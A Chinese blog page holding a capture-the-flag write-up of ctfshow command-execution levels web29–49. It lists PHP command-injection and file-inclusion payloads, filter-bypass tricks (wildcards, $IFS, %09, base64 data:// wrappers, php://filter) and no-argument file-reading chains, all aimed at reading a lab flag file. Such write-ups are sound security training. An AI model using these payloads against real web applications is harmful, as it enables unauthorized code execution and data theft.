<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yun421.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="短暂的热爱过后剩下的是坚持">
<meta property="og:type" content="website">
<meta property="og:title" content="Yun421">
<meta property="og:url" content="http://yun421.top/index.html">
<meta property="og:site_name" content="Yun421">
<meta property="og:description" content="短暂的热爱过后剩下的是坚持">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Yun421">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://yun421.top/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Yun421</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="Yun421" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Yun421</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">记录学习中的点点滴滴</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-resources">

    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yun421.top/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yun421">
      <meta itemprop="description" content="短暂的热爱过后剩下的是坚持">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yun421">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">ctfshow.命令执行</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-11-19 12:54:41 / 修改时间：14:06:03" itemprop="dateCreated datePublished" datetime="2021-11-19T12:54:41+08:00">2021-11-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ctfshow-命令执行"><a href="#ctfshow-命令执行" class="headerlink" title="ctfshow.命令执行"></a>ctfshow.命令执行</h1><h3 id="类型一-web29-36"><a href="#类型一-web29-36" class="headerlink" title="类型一:web29-36"></a>类型一:web29-36</h3><p>变量c来接受并过滤传入的数据,eval函数来执行 </p>
<h3 id="类型二-web37-41"><a href="#类型二-web37-41" class="headerlink" title="类型二:web37-41"></a>类型二:web37-41</h3><p>变量c接收并过滤传入的数据,include来包含文件</p>
<h3 id="类型三-web42-57"><a href="#类型三-web42-57" class="headerlink" title="类型三:web42-57"></a>类型三:web42-57</h3><p>接受并过滤传入的变量拼接命令执行（system函数）</p>
<h3 id="类型四-web58-77"><a href="#类型四-web58-77" class="headerlink" title="类型四:web58-77"></a>类型四:web58-77</h3><p>PHP代码执行，突破禁用函数,绕过disable_functions</p>
<h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/chrome_YQfHFrvnwg.png" alt="chrome_YQfHFrvnwg"></p>
<p>题目只过滤了flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=system(&#x27;cat f*&#x27;);</span><br></pre></td></tr></table></figure>

<p>在linux系统中 有一些通配符</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\*匹配任何字符串／文本，包括空字符串；*代表任意字符（<span class="number">0</span>个或多个） ls file *</span><br><span class="line">?	匹配任何一个字符（不在括号内时）?代表任意<span class="number">1</span>个字符 ls file <span class="number">0</span></span><br><span class="line">[abcd]	匹配abcd中任何一个字符</span><br><span class="line">[a-z]	表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file <span class="number">0</span></span><br></pre></td></tr></table></figure>



<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_wcuwIJzADQ-16373017351823.png" alt="chrome_wcuwIJzADQ"></p>
<p>比上一题多过滤了<code>|system|php|</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=echo `cat f*`;</span><br></pre></td></tr></table></figure>

<p>命令执行函数：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system() </span><br><span class="line">passthru() </span><br><span class="line"><span class="built_in">exec</span>() </span><br><span class="line">shell_exec() </span><br><span class="line">popen() </span><br><span class="line">proc_open() </span><br><span class="line">pcntl_exec() </span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>

<p>system函数是有回显的，其他的函数可以通过echo等显示</p>
<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_NmuQjvEa2j-16373017351822.png" alt="chrome_NmuQjvEa2j"></p>
<p>这个题比上个题多过滤了<code>|cat|sort|shell|\.| |\&#39;|</code>这些，主要进行空格过滤和cat过滤绕过。</p>
<p>在linux 空格可以用以下字符串代替： </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt; &lt;&gt; 重定向符 </span><br><span class="line">%09(需要php环境) </span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span> </span><br><span class="line">$IFS<span class="variable">$9</span> </span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能 </span><br><span class="line">%20 </span><br><span class="line">%09</span><br></pre></td></tr></table></figure>

<p>在linux中与cat有类似功能的有如下字符：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=echo%09`tac%09fl*`;</span><br></pre></td></tr></table></figure>



<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_TI4kEjFbHb-16373017351824.png" alt="chrome_TI4kEjFbHb"></p>
<p>比上一题多过滤了<code>|\`|echo|\;|</code>，分号可以用<code>?&gt;</code>绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：c=include&quot;$_POST[1]&quot;?&gt;    </span><br><span class="line">post：1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>



<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_140mQ45lhA-16373017351826.png" alt="chrome_140mQ45lhA"></p>
<p>比上一题多过滤了<code>|”|</code>,但是不影响操作,去掉也可以正常拿到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：c=include$_POST[1]?&gt;     </span><br><span class="line">post：1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>



<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_MVQwMyKJPJ-16373017351825.png" alt="chrome_MVQwMyKJPJ"></p>
<p>比上一题多过滤了<code>|:|</code>,同理并不影响操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：c=include$_POST[1]?&gt;     </span><br><span class="line">post：1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>



<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_cxgUR6nmcT-16373017351828.png" alt="chrome_cxgUR6nmcT"></p>
<p>比上一题多过滤了<code>|\&lt;|\=|</code>，同理并不影响操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=include$_POST[1]?&gt;     post：1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>



<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_dPy9iQJBHE-16373017351827.png" alt="chrome_dPy9iQJBHE"></p>
<p>比上一题多过滤了<code>|/|[0-9]|</code>,把post传的数字改为字母即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：c=include$_POST[a]?&gt;     </span><br><span class="line">post：a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>



<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_DqhhYdOvf5-16373017351829.png" alt="chrome_DqhhYdOvf5"></p>
<p>题目源码出现了PHP文件包含函数include()，利用伪协议读flag</p>
<p><code>data://</code>，可以让用户来控制输入流，当它与包含函数结合时，用户输入的<code>data://</code>流会被当作php文件执行</p>
<p>过滤了flag,flag.php 可以用通配符绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=data://text/plain,&lt;?php system(&quot;cat f*&quot;);</span><br></pre></td></tr></table></figure>



<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_HOO2MZLVqF-163730173518210.png" alt="chrome_HOO2MZLVqF"></p>
<p>比上一题多过滤了<code>|php|file|</code>,把php用base64编码一下绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZioiKTs=</span><br></pre></td></tr></table></figure>



<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_cfkuWG65mH-163730173518311.png" alt="chrome_cfkuWG65mH"></p>
<p>这道题限制了后缀</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=data://text/plain,&lt;?php system(&quot;cat f*&quot;)?&gt;</span><br></pre></td></tr></table></figure>

<p>相当于执行了php语句<code>&lt;?php system(&#39;cat f*&#39;)?&gt;.php</code><br>因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用</p>
<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_KLlk8pWeRW-163730173518312.png" alt="chrome_KLlk8pWeRW"></p>
<p>这道题过滤了很多</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|[0-9]|\~|\`|@|\<span class="comment">#|\$|%|^|\&amp;|\*|\\|\-|=|\+|\&#123;|\[|\]|\&#125;|:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|</span></span><br></pre></td></tr></table></figure>

<p>过滤了引号、美元符号、冒号，这里可以构造无参数函数进行文件读取</p>
<p>先get传参：<code>c=print_r(scandir(current(localeconv())));</code>查看当前目录所有文件名</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [<span class="number">0</span>] =&gt; . [<span class="number">1</span>] =&gt; .. [<span class="number">2</span>] =&gt; flag.php [<span class="number">3</span>] =&gt; index.php )</span><br></pre></td></tr></table></figure>

<p>可以发现flag.php在数组的倒数第二个值里,我们可以通过 array_reverse 进行逆转数组,然后用next()函数进行下一个值的读取,成功读取flag.php文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>



<h3 id="补充：无参数文件读取"><a href="#补充：无参数文件读取" class="headerlink" title="补充：无参数文件读取"></a>补充：无参数文件读取</h3><p>​                                                                                                                   <strong>–摘取自(<a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13778333.html">https://www.cnblogs.com/NPFS/p/13778333.html</a>)</strong></p>
<p>无参数的意思可以是a()、a(b())或a(b(c()))，但不能是a(‘b’)或a(‘b’,’c’)，不能带参数</p>
<h4 id="print-r-scandir-‘-’"><a href="#print-r-scandir-‘-’" class="headerlink" title="print_r(scandir(‘.’))"></a>print_r(scandir(‘.’))</h4><p>可以用来查看当前目录所有文件名</p>
<p>但是我们这里说的是要构造无参数的函数，所以我们要做的就是去掉这个点号</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">current() 函数返回数组中的当前元素（单元）,默认取第一个值，</span><br><span class="line"><span class="keyword">pos</span>() 同 current() ,是current()的别名</span><br><span class="line"><span class="keyword">reset</span>() 函数返回数组第一个单元的值，如果数组为空则返回 FALSE</span><br></pre></td></tr></table></figure>

<p>**localeconv() ** 函数 返回数组的第一项就是 . (小数点)</p>
<p>我们可以通过读取该小数点代替print_r(scandir(‘.’))中的小数点 ，读取数组第一项可以的函数有current()、pos() 、reset()</p>
<p>所以最终我们可以构造如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br><span class="line">print_r(scandir(reset(localeconv())));</span><br></pre></td></tr></table></figure>



<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_N84ShA8V3j-163730173518313.png" alt="chrome_N84ShA8V3j"></p>
<p>这个题过滤了<code>$、+、-、^、~</code>使得<strong>异或、自增和取反</strong>构造字符都无法使用，同时还过滤了字母和数字。但是留了个或运算符<code>|</code></p>
<p>尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符，fuzz一下</p>
<p>从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符，然后传递参数getflag</p>
<p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/cmd_UeDS60CT4e-163730173518314.png" alt="cmd_UeDS60CT4e"></p>
<p><strong>ps：羽师傅出题实在精品，这题是后来回头再看慢慢理解出的，给师傅点赞了</strong></p>
<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_rT41TzTa2i-163730173518315.png" alt="chrome_rT41TzTa2i"></p>
<p><strong>command &gt; /dev/null 2&gt;&amp;1</strong></p>
<p>通过三部分介绍该语句的函数就是将标准输出和标准错误输出重定向到伪设备<code>/dev/null</code>,它的作用就是执行某个命令将不会有任何日志输出。</p>
<p>我们要让命令回显，那么进行命令分隔即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;	//分号</span><br><span class="line">|	//只执行后面那条命令</span><br><span class="line">||	//只执行前面那条命令</span><br><span class="line">&amp;	//两条命令都会执行</span><br><span class="line">&amp;&amp;	//两条命令都会执行</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：cat flag.php;</span><br></pre></td></tr></table></figure>



<h4 id="补充：要点分解"><a href="#补充：要点分解" class="headerlink" title="补充：要点分解"></a>补充：要点分解</h4><p>​                                                                                                        <strong>–摘取自<a target="_blank" rel="noopener" href="https://blog.csdn.net/c_base_jin/article/details/87894722">https://blog.csdn.net/c_base_jin/article/details/87894722</a></strong></p>
<p>为了能理解<code>commond &gt; /dev/null 2&gt;&amp;1</code>命令的具体意思，我们将分三个要点进行介绍。</p>
<p>part 1 伪设备</p>
<p>在类Unix系统上的设备节点不一定必须与物理设备相对应。缺少此对应关系的节点构成伪设备组。它们提供操作系统处理的各种功能。一些最常用（基于字符的）伪设备包括：</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/dev/null - 接受并丢弃所有输入; 不产生输出（总是在读取时返回文件结束指示）</span><br><span class="line">/dev/zero - 接受并丢弃所有输入; 产生连续的NUL（零值）字节流</span><br><span class="line">/dev/full - 读取时产生连续的NUL（零值）字节流，并在写入时返回“磁盘已满”消息</span><br><span class="line">/dev/random和/dev/urandom -它们产生的一个可变长度的数据流的伪随机数。</span><br></pre></td></tr></table></figure>

<p>part 2 文件描述符</p>
<p>在类unix系统中，当系统启动时就已经有三个标准文件流以及三个文件描述符被预先占用了，其对应关系如下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">名称	     文件描述符	  缩写	设备</span><br><span class="line">标准输入	   0	   STDIN	键盘</span><br><span class="line">标准输出	   1	   STDOUT	屏幕</span><br><span class="line">标准错误输出    2	     STDERR	   屏幕</span><br></pre></td></tr></table></figure>

<p>当我们执行某个命令时，如果该命令执行正确并且有输出，则该命令的输出是在标准输出设备。如果该命令执行失败，类unix系统则会给出提示，该提示在标准错误设备输出。</p>
<p><strong>part 3 重定向</strong></p>
<p>重定向是把输出定向到文件或者标准流，重定向符有两个：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.&gt; 以覆盖的方式重定向输出到文件</span><br><span class="line"></span><br><span class="line">2.&gt;&gt;以追加的方式重定向输出到文件</span><br></pre></td></tr></table></figure>

<p>在之前也说过，若命令执行错误，标准错误输出也给出打印，若想要将标准错误输出不在屏幕输出，则需要使用重定向技术，将标准错误输出重定向到标准输出 <code>2&gt;&amp;1</code>：</p>
<p>&amp;是<strong>用来告诉系统1这里指的是标准输出，而不是文件</strong>。</p>
<h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_fnIYPoD278-163730173518316.png" alt="chrome_fnIYPoD278"></p>
<p>比上题多过滤了cat和分号,替换下就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=tac flag.php%0a</span><br></pre></td></tr></table></figure>



<h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_16eEJuShqS-163730173518317.png" alt="chrome_16eEJuShqS"></p>
<p>比上题多过滤了flag,绕过就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=tac fla*%0a</span><br></pre></td></tr></table></figure>



<h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_kAWKE1cGdu-163730173518318.png" alt="chrome_kAWKE1cGdu"></p>
<p>比上题多过滤了空格,替换就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=tac%09fl*.php%0a</span><br></pre></td></tr></table></figure>



<h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_LOEhAcLqtd-163730173518319.png" alt="chrome_LOEhAcLqtd"></p>
<p>比上题多过滤了数字和<code>$</code>和<code>*</code>,替换就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=tac%09fl[a-z]g.php||</span><br></pre></td></tr></table></figure>



<h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_QKawdj6D8f-163730173518320.png" alt="chrome_QKawdj6D8f"></p>
<p>比上题多过滤了<code>|more|less|head|sort|tail|</code>,不影响操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=tac%09fl[a-z]g.php||</span><br></pre></td></tr></table></figure>



<h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_mGw3IMsXb8-163730173518321.png" alt="chrome_mGw3IMsXb8"></p>
<p>比上题多过滤了<code>|sed|cut|awk|strings|od|curl|\`|</code>，不影响操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=tac%09fl[a-z]g.php||</span><br></pre></td></tr></table></figure>



<h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><p><img src="/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Users/23627/Pictures/Saved%20Pictures/chrome_95H7mKK28r-163730173518322.png" alt="chrome_95H7mKK28r"></p>
<p>比上题多过滤了<code>%</code>,用<code>&lt;&gt;</code>替换一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=tac&lt;fl[a-z]g.php||</span><br></pre></td></tr></table></figure>



